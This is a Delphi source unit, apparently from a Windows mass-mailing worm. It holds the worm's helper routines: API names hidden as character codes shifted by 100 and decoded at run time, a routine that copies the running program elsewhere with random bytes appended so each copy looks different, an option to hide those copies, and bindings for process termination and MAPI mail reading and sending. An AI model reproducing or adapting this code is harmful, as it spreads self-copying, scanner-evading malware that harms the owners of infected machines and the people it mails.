UNIT Utils;

INTERFACE

USES GetProc;

VAR
  pDllProcesses : ARRAY [1..20] OF Pointer;
  Software      : pChar;
  PlutonXX      : pChar;
  SoftwareMic   : pChar;

CONST
  CRLF                  = #13#10;
  WM_DESTROY            = 2;
  TH32CS_SNAPPROCESS    = 2;
  FILE_ATTRIBUTE_HIDDEN = 2;
  HKEY_CURRENT_USER     = $80000001;
  HKEY_LOCAL_MACHINE    = $80000002;
  faHidden              = $00000002;
  faSysFile             = $00000004;
  faVolumeID            = $00000008;
  faDirectory           = $00000010;
  faAnyFile             = $0000003F;
  MB_ICONHAND           = $00000010;
  INVALID_HANDLE_VALUE  = LONGWORD(-1);
  MAX_PATH              = 260;
  WAIT_TIMEOUT          = 258;
  VER_PLATFORM_WIN32_NT = 2;
  DRIVE_FIXED           = 3;
  SW_HIDE               = 0;
  SW_SHOW               = 1;
  GWL_EXSTYLE           = -20;
  WS_EX_TOOLWINDOW      = 128;
  SUCCESS_SUCCESS       = 0;
  MAPI_NEW_SESSION      = 2;
  MAPI_ENVELOPE_ONLY    = 40;
  Chars : STRING        = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';
  WS_OVERLAPPED         = 0;
  WS_CAPTION            = $C00000;
  WS_SYSMENU            = $80000;
  WS_THICKFRAME         = $40000;
  WS_MINIMIZEBOX        = $20000;
  WS_MAXIMIZEBOX        = $10000;
  WS_VISIBLE            = $10000000;
  WS_OVERLAPPEDWINDOW   = (WS_OVERLAPPED OR WS_CAPTION OR WS_SYSMENU OR WS_THICKFRAME OR WS_MINIMIZEBOX OR WS_MAXIMIZEBOX);

TYPE
  DWORD      = LongWord;
  BOOL       = LongBool;
  LPDWORD    =^DWORD;
  HWND       = TYPE LongWord;
  THandle    = Integer;
  LRESULT    = DWORD;
  ATOM       = WORD;
  HICON      = TYPE LongWord;
  HBRUSH     = TYPE LongWord;
  HINST      = TYPE LongWord;
  HMENU      = TYPE LongWord;
  HCURSOR    = HICON;
  UINT       = LongWord;
  TFNWndProc = Pointer;
  WPARAM     = DWORD;
  LPARAM     = DWORD;

  XArray = ARRAY[1..500] OF STRING;

  TWndClass = PACKED RECORD
    style         : UINT;
    lpfnWndProc   : TFNWndProc;
    cbClsExtra    : Integer;
    cbWndExtra    : Integer;
    hInstance     : HINST;
    hIcon         : HICON;
    hCursor       : HCURSOR;
    hbrBackground : HBRUSH;
    lpszMenuName  : PAnsiChar;
    lpszClassName : PAnsiChar;
  END;

  TPoint = RECORD
    X : Integer;
    Y : Integer;
  END;

  TMsg = PACKED RECORD
    hwnd    : HWND;
    message : UINT;
    wParam  : WPARAM;
    lParam  : LPARAM;
    time    : DWORD;
    pt      : TPoint;
  END;

  lpup = ARRAY[0..512] OF Char;

  lpMapiFileDesc =^TMapiFileDesc;

  TMapiFileDesc = RECORD
    ulReserved   : DWORD;
    flFlags      : DWORD;
    nPosition    : DWORD;
    lpszPathName : PChar;
    lpszFileName : PChar;
    lpFileType   : Pointer;
  END;

  lpMapiRecipDesc = ^TMapiRecipDesc;

  TMapiRecipDesc = RECORD
    ulReserved   : DWORD;
    ulRecipClass : DWORD;
    lpszName     : PChar;
    lpszAddress  : PChar;
    ulEIDSize    : DWORD;
    lpEntryID    : Pointer;
  END;

  lpMapiMessage =^TMapiMessage;

  TMapiMessage = RECORD
    ulReserved         : DWORD;
    lpszSubject        : PChar;
    lpszNoteText       : PChar;
    lpszMessageType    : PChar;
    lpszDateReceived   : PChar;
    lpszConversationID : PChar;
    flFlags            : DWORD;
    lpOriginator       : lpMapiRecipDesc;
    nRecipCount        : DWORD;
    lpRecips           : lpMapiRecipDesc;
    nFileCount         : DWORD;
    lpFiles            : lpMapiFileDesc;
  END;

  PMAPIMessage=^TMAPIMessage;

  TOSVersionInfo = RECORD
    dwOSVersionInfoSize : DWORD;
    dwMajorVersion      : DWORD;
    dwMinorVersion      : DWORD;
    dwBuildNumber       : DWORD;
    dwPlatformId        : DWORD;
    szCSDVersion        : ARRAY [0..127] OF AnsiChar;
  END;

  TProcessEntry32 = RECORD
    dwSize              : Cardinal;
    cntUsage            : Cardinal;
    th32ProcessID       : Cardinal;
    th32DefaultHeapID   : Cardinal;
    th32ModuleID        : Cardinal;
    cntThreads          : Cardinal;
    th32ParentProcessID : Cardinal;
    pcPriClassBase      : Integer;
    dwFlags             : Cardinal;
    szExeFile           : ARRAY [0..259] OF Char;
  END;

CONST
  sKernel32Process : pChar =
                    #167+#214+#201+#197+#216+#201+#168+#205+#214+#201+#199+#216+
                    #211+#214+#221+#165+#144+#171+#201+#216+#176+#197+#215+#216+
                    #169+#214+#214+#211+#214+#144+#184+#201+#214+#209+#205+#210+
                    #197+#216+#201+#180+#214+#211+#199+#201+#215+#215+#144+#179+
                    #212+#201+#210+#180+#214+#211+#199+#201+#215+#215+#144+#167+
                    #208+#211+#215+#201+#172+#197+#210+#200+#208+#201+#144+#180+
                    #214+#211+#199+#201+#215+#215+#151+#150+#170+#205+#214+#215+
                    #216+#144+#167+#214+#201+#197+#216+#201+#184+#211+#211+#208+
                    #204+#201+#208+#212+#151+#150+#183+#210+#197+#212+#215+#204+
                    #211+#216+#144+#180+#214+#211+#199+#201+#215+#215+#151+#150+
                    #178+#201+#220+#216+#144+#187+#197+#205+#216+#170+#211+#214+
                    #183+#205+#210+#203+#208+#201+#179+#198+#206+#201+#199+#216+
                    #144+#167+#214+#201+#197+#216+#201+#177+#217+#216+#201+#220+
                    #165+#144+#171+#201+#216+#186+#201+#214+#215+#205+#211+#210+
                    #169+#220+#165+#144+#171+#201+#216+#168+#214+#205+#218+#201+
                    #184+#221+#212+#201+#165+#144+#167+#211+#212+#221+#170+#205+
                    #208+#201+#165+#144+#183+#201+#216+#170+#205+#208+#201+#165+
                    #216+#216+#214+#205+#198+#217+#216+#201+#215+#165+#144+#171+
                    #201+#216+#187+#205+#210+#200+#211+#219+#215+#168+#205+#214+
                    #201+#199+#216+#211+#214+#221+#165;

  sMAPIProcess : pChar =
                    #177+#165+#180+#173+#183+#201+#210+#200+#177+#197+#205+#208+
                    #144+#177+#165+#180+#173+#176+#211+#203+#211+#210+#144+#177+
                    #165+#180+#173+#170+#205+#210+#200+#178+#201+#220+#216+#144+
                    #177+#165+#180+#173+#182+#201+#197+#200+#177+#197+#205+#208+
                    #144+#177+#165+#180+#173+#176+#211+#203+#211+#202+#202;

  sUSER32Process : pChar =
                    #183+#204+#211+#219+#187+#205+#210+#200+#211+#219+#144+#183+
                    #201+#216+#187+#205+#210+#200+#211+#219+#176+#211+#210+#203+
                    #165+#144+#171+#201+#216+#187+#205+#210+#200+#211+#219+#176+
                    #211+#210+#203+#165+#144+#171+#201+#216+#177+#201+#215+#215+
                    #197+#203+#201+#165+#144+#175+#205+#208+#208+#184+#205+#209+
                    #201+#214+#144+#183+#201+#216+#184+#205+#209+#201+#214+#144+
                    #180+#211+#215+#216+#181+#217+#205+#216+#177+#201+#215+#215+
                    #197+#203+#201+#144+#168+#201+#202+#187+#205+#210+#200+#211+
                    #219+#180+#214+#211+#199+#165+#144+#168+#205+#215+#212+#197+
                    #216+#199+#204+#177+#201+#215+#215+#197+#203+#201+#165+#144+
                    #177+#201+#215+#215+#197+#203+#201+#166+#211+#220+#165+#144+
                    #182+#201+#203+#205+#215+#216+#201+#214+#167+#208+#197+#215+
                    #215+#165;
VAR
  //////////////////////////////\KERNEL32.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  CreateDir                : FUNCTION(lpPathName:STRING;lpSecurityAttributes:Integer) : BOOL; STDCALL;
  GetLastError             : FUNCTION : DWORD; STDCALL;
  TerminateProcess         : FUNCTION(hProcess,uExitCode:Cardinal) : BOOL; STDCALL;
  OpenProcess              : FUNCTION(wDesiredAccess:Cardinal;blnheritHandle:LongBool;dwProcessld:Cardinal) : Integer; STDCALL;
  CloseHandle              : FUNCTION(hObject:Cardinal) : BOOl; STDCALL;
  Process32First           : FUNCTION(hSnapshot:Integer;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
  CreateToolHelp32Snapshot : FUNCTION(dwFlags,th32ProcessID:Cardinal) : Integer; STDCALL;
  Process32Next            : FUNCTION(hSnapshot:Cardinal;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
  WaitForSingleObject      : FUNCTION(hHandle,dwMilliseconds:Cardinal) : Cardinal; STDCALL;
  CreateMutexA             : FUNCTION(lpMutexAttributes:Pointer;bInitialOwner:BOOL;lpName:STRING) : Cardinal; STDCALL;
  GetVersionEx             : FUNCTION(VAR lpVersionInformation:TOSVersionInfo) : BOOL; STDCALL;
  GetDriveType             : FUNCTION(lpDisk:STRING) : Integer; STDCALL;
  CopyFile2                : FUNCTION(lpExistingFileName,lpNewFileName:PChar;bFailIfExists:BOOL) : BOOL; STDCALL;
  SetFileAttributes        : FUNCTION(lpFileName:pChar;dwFileAttributes:DWORD) : LongBool; STDCALL;
  GetWindowsDirectory      : FUNCTION(lpBuffer:PChar;uSize:LongWord): LongWord; STDCALL;
  ///////////////////////////////\MAPI32.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  MAPISendMail             : FUNCTION(lhSession:DWORD;ulUIParam:DWORD;lpMessage:lpMapiMessage;flFlags:DWORD;ulReserved:DWORD) : DWORD; STDCALL;
  MAPILogOn                : FUNCTION(ulUIParam:Cardinal;lpszProfileName,lpszPassword:pChar;flFlags,ulReserved:Cardinal;VAR lplhSession:cardinal) : Cardinal; STDCALL;
  MAPIFindNext             : FUNCTION(lhSession,ulUIParam:Cardinal;lpszMsgType,lpszSeedMsgID:pChar;flFlags,ulReserved:Cardinal;VAR lpszMsgI:lpup) : Cardinal; STDCALL;
  MAPIReadMail             : FUNCTION(lhSession,ulUIParam:Cardinal;lpszMessageID:pChar;flFlags,ulReserved:Cardinal;VAR lppMessage:PMAPIMessage) : Cardinal; STDCALL;
  MAPILogOff               : FUNCTION(lhSession,ulUIParam,flFlags,ulReserved:Cardinal) : Cardinal; STDCALL;
  ///////////////////////////////\USER32.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  ShowWindow               : FUNCTION(hWnd:HWND;nCmdShow:Integer) : BOOL; STDCALL;
  SetWindowLong            : FUNCTION(hWnd:HWND;nIndex:Integer;dwNewLong:DWORD) : DWORD; STDCALL;
  GetWindowLong            : FUNCTION(hWnd,nIndex:Integer) : Integer; STDCALL;
  GetMessage               : FUNCTION(VAR lpMsg:TMsg;hWnd:HWND;wMsgFilterMin,wMsgFilterMax:UINT) : BOOL; STDCALL;
  KillTimer                : FUNCTION(hWnd:HWND;uIDEvent:UINT) : BOOL; STDCALL;
  SetTimer                 : FUNCTION(hWnd:HWND;nIDEvent,uElapse:UINT;lpTimerFunc:Pointer) : UINT; STDCALL;
  PostQuitMessage          : PROCEDURE(nExitCode:Integer); STDCALL;
  DefWindowProc            : FUNCTION(hWnd:HWND;Msg:UINT;wParam:WPARAM;lParam:LPARAM) : LRESULT; STDCALL;
  DispatchMessage          : FUNCTION(CONST lpMsg: TMsg) : DWORD; STDCALL;
  MessageBox               : FUNCTION(hWnd:HWND;lpText,lpCaption:PChar;uType:UINT) : Integer; STDCALL;
  RegisterClass            : FUNCTION(CONST WndClass:TWndClass) : ATOM; STDCALL;
  ///////////////////////////////\SHLWAPI.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  FileExists               : FUNCTION(pszPath:STRING) : BOOL; STDCALL;
  ///////////////////////////////\WININET.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  InternetGetConnectedState: FUNCTION(lpdwFlags:LPDWORD;dwReserved:DWORD) : BOOL; STDCALL;

FUNCTION LoadLibrary(LibFileName:PChar) : THandle; STDCALL; EXTERNAL 'kernel32' Name 'LoadLibraryA';
FUNCTION IntToHex2(X:BYTE) : STRING;
FUNCTION ExtractFileName(FileName:STRING) : STRING;
FUNCTION DecodeStrings(EncodedString:pChar;VAR DecodedString:XArray) : WORD;
PROCEDURE InitProcesses;
PROCEDURE GetAddr(Lib:pChar;sArray:pChar);
PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);

IMPLEMENTATION

PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
VAR
  I           : WORD;
  F           : FILE;
  RandomBytes : ARRAY[0..512] OF BYTE;
BEGIN
  CopyFile2(pChar(paramstr(0)),pChar(DestinationFile),False);
  FOR I:=1 TO 512 DO RandomBytes[I]:=Random(255);

  AssignFile(F,DestinationFile);
  Reset(F,1);
  Seek(F,(FileSize(F) DIV 512)*512);
  Truncate(F);
  BlockWrite(F,RandomBytes[0],Random(508));
  CloseFile(F);

  IF Hide THEN SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
END;

PROCEDURE GetAddr(Lib:pChar;sArray:pChar);
VAR
  I   : BYTE;
  Num : WORD;
  O   : XArray;
  L   : THandle;
BEGIN
  L:=LoadLibrary(LIB);
  Num:=DecodeStrings(sArray,O);
  FOR I:=1 TO Num DO pDllProcesses[I]:=GetProcAddress(L,pChar(O[I]));
END;

PROCEDURE InitProcesses;
BEGIN
  GetAddr('kernel32',sKernel32Process);

  CreateDir:=pDllProcesses[1];
  GetLastError:=pDllProcesses[2];
  TerminateProcess:=pDllProcesses[3];
  OpenProcess:=pDllProcesses[4];
  CloseHandle:=pDllProcesses[5];
  Process32First:=pDllProcesses[6];
  CreateToolHelp32Snapshot:=pDllProcesses[7];
  Process32Next:=pDllProcesses[8];
  WaitForSingleObject:=pDllProcesses[9];
  CreateMutexA:=pDllProcesses[10];
  GetVersionEx:=pDllProcesses[11];
  GetDriveType:=pDllProcesses[12];
  CopyFile2:=pDllProcesses[13];
  SetFileAttributes:=pDllProcesses[14];
  GetWindowsDirectory:=pDllProcesses[15];

  GetAddr('mapi',sMAPIProcess);

  MAPISendMail:=pDllProcesses[1];
  MAPILogOn:=pDllProcesses[2];
  MAPIFindNext:=pDllProcesses[3];
  MAPIReadMail:=pDllProcesses[4];
  MAPILogOff:=pDllProcesses[5];

  GetAddr('user32',sUSER32Process);

  ShowWindow:=pDllProcesses[1];
  SetWindowLong:=pDllProcesses[2];
  GetWindowLong:=pDllProcesses[3];
  GetMessage:=pDllProcesses[4];
  KillTimer:=pDllProcesses[5];
  SetTimer:=pDllProcesses[6];
  PostQuitMessage:=pDllProcesses[7];
  DefWindowProc:=pDllProcesses[8];
  DispatchMessage:=pDllProcesses[9];
  MessageBox:=pDllProcesses[10];
  RegisterClass:=pDllProcesses[11];

  FileExists:=GetProcAddress(LoadLibrary('shlwapi'),'PathFileExistsA');
  InternetGetConnectedState:=GetProcAddress(LoadLibrary('wininet'),'InternetGetConnectedState');
END;

FUNCTION DecodeStrings(EncodedString:pChar;VAR DecodedString:XArray) : WORD;
VAR
  I : WORD;
  B : WORD;
  S : STRING;
BEGIN
  FOR I:=0 TO Length(EncodedString)-1 DO S:=S+Chr(Ord(EncodedString[I])-100);
  S:=S+',';
  I:=1;
  REPEAT
    B:=Pos(',',S);
    DecodedString[I]:=pChar(Copy(S,1,B-1));
    Delete(S,1,B);
    Inc(I);
  UNTIL Length(S)=0;
  RESULT:=I-1;
END;

FUNCTION IntToHex2(X:BYTE) : STRING;
BEGIN
  IntToHex2:=Concat(Chars[X SHR 4 + 1],Chars[X AND 15 + 1]);
END;

FUNCTION ExtractFileName(FileName:STRING) : STRING;
VAR
  I : Integer;
BEGIN
  I:=Length(FileName);
  WHILE(I>=1)AND NOT(FileName[I] IN ['\',':']) DO Dec(I);
  RESULT:=Copy(FileName,I+1,255);
  IF (Length(RESULT)>0)AND(RESULT[Length(Result)]=#0) THEN Setlength(RESULT,Length(RESULT)-1);
END;

END.
